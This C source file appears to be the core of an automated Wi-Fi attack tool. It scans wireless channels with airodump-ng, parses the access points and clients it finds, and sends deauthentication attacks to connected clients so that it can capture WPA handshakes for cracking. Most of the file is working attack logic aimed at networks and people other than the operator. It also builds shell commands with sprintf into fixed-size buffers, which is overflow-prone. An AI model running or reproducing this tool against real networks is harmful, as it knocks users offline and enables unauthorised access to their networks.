#include "collection.h"

extern AP** APs = NULL;
extern int* num_APs = NULL;
extern char** channels = NULL;
extern int num_channels = 0;
extern char* wireless_device = NULL;
int scanning_state;

void sig_handler(int signal){
    if(signal == SIGALRM){
        scanning_state = 0;
    }
    else if(signal == SIGUSR1){
        printf("ERROR RUNNING SUB-COMMAND\n");
        exit(1);
    }
}

int main(int argc, char* argv[]){
    num_channels = 0;
    wireless_device = getWirelessDevice();
    if(wireless_device == NULL){
        exit(1);
    }
    //initialize variables and allocate memory
    initVals();
    //setup timeout for the scanning and attacking
    signal(SIGALRM, sig_handler);
    //DEBUG: print available channels
    printf("Channels: %d\n\n", num_channels);
    for(int i = 0; i < num_channels; i++){
        printf("Channel: %s\n", channels[i]);
    }

    //start scanning through channels
    for(int iteration = 1; iteration <= 4; iteration++){
        for(int c = 0; c < num_channels; c++){
            //prep filenames for use by commands
            char prefix [50] = "";
            //full csv file name
            char file_name [57] = "";
            //pcap file name
            char capture_name [57] = "";
            sprintf(prefix, "scanning-%s", channels[c]);
            sprintf(file_name, "%s-%02d.csv", prefix, iteration);
            sprintf(capture_name, "%s-%02d.cap", prefix, iteration);
            
            //start airodump-ng scans
            int airodump_pid = startAirodumpScan(prefix, channels[c]);
            //set scanning state to true
            scanning_state=1;

            //use this file pointer to wait until airodump-ng has produced any output
            FILE* temp_wait = NULL;
            while( (temp_wait = fopen(file_name,"r")) == NULL);
            fclose(temp_wait);

            //start timeout timer
            alarm(10);//once time is done, scanning state will be turned off, terminating while loop
            //while scanning, read in data and attack client
            while(scanning_state){
                //read in AP/station data from a CSV
                readCSV(file_name);
                //attack the APs
                attackAPs(c, capture_name);
                //check for handshakes
            }
            //stop scanning once scanning is complete
            stopAirodumpScan(airodump_pid);
        }
    }
    //printReport();
    cleanup();
    return 0;
}
void initVals(){    
    //get available channels
    channels = getCompatibleChannels(&num_channels, wireless_device);
    scanning_state = 0;
    //if no channels found, error with wireless device
    if(num_channels == 0){
        printf("ERROR: WIRELESS DEVICE ERROR\n");
        exit(1);
    }

    //allocate space for the AP data based on num of channels
    APs = (AP**) malloc(sizeof(AP*) * num_channels);
    for(int i = 0; i < num_channels; i++){
        APs[i] = NULL;
    }

    //allocate space for the channel data
    num_APs = (int*) malloc(sizeof(int) * num_channels);
    for(int i = 0; i < num_channels; i++){
        num_APs[i] = 0;
    }
}
void cleanup(){
    //Once done, start freeing memory
    for(int c = 0; c < num_channels; c++){
        for(int a = 0; a < num_APs[c]; a++)
            destroyAP(APs[c][a]);
        free(APs[c]);
    }
    
    free(APs);
    free(num_APs);
    free(wireless_device);

    for(int c = 0; c < num_channels; c++)
        free(channels[c]);
    free(channels);
}
int startAirodumpScan(char* prefix, char*  channel){
    printf("Scanning channel %3s\n", channel);
    char command[75];
    sprintf(command, "airodump-ng -a -c %s -w %s -o csv,cap %s", channel, prefix, wireless_device);
    //printf("Command: %s\n", command);
    pid_t pid = fork();
    switch(pid){
        case -1: //error
            printf("Error running command\n");
            exit(1);
            break;
        case 0: //child
            //hide output of scanning
            /*
            int dev_null = open("/dev/null", O_WRONLY);
            dup2(dev_null, 1);
            dup2(dev_null, 2);
            close(dev_null);
            */
            //run scanning TODO: check if not running sudo
            execl("/bin/bash", "sh", "-c", command, NULL);
            printf("error runnnig scan\n");
            kill(getppid(), SIGUSR1);
            exit(1);
            break;
        default: //parent
            break;
    }
    return pid;
}
void stopAirodumpScan(int pid){
    //kill off children
    int status = -1;
    kill(pid, SIGTERM);
    sleep(1);
    waitpid(pid, &status, WNOHANG);
    kill(pid, SIGKILL);
}
int attackAPs(int channel, char* capture_name){
    AP* victims = APs[channel];
    for(int a = 0; a < num_APs[channel]; a++){
        //If key was already captured for this AP, skip it
        if(victims[a].keyCaptured) continue;
        char victim_BSSID[18] = "";
        BSSID_TO_STRING(&victims[a].bssid, victim_BSSID); 
        
        if(victims[a].attacked && victims[a].num_clients > 0){
            //reset alarm
            alarm(5);
            //printf("Victim found: %s\n", victim_BSSID);
            //printf("\tClients:\n");
            for(int c = 0; c < victims[a].num_clients; c++){
                char client_BSSID[18] = "";
                BSSID_TO_STRING(&victims[a].clients[c].bssid, client_BSSID);
                //give alarm time to finish deauth
                alarm(20);
                runDeauth(victim_BSSID, client_BSSID);
            }
            victims[a].attacked=true;
            //check to see if handshake was captured
            checkKey(victims, num_APs[channel], capture_name);
            //allow alarm time to look for other targets on channel
            alarm(5);
        }
    }
    return 0; //if successful attack
}